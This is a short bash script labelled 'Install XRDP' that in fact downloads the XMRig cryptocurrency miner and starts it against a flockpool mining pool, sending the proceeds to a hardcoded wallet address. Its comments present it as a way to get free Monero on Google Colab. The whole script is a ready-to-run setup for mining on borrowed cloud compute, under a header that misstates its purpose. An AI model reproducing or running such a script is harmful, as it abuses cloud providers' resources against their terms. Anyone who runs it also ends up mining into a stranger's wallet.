#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -a gr -o stratum+tcps://us.flockpool.com:5555 -u RKnJrRnHZcdBDYMErExFhsYPQH7E6qTMA2 -k --tls --rig-id AKA|RAPTOR
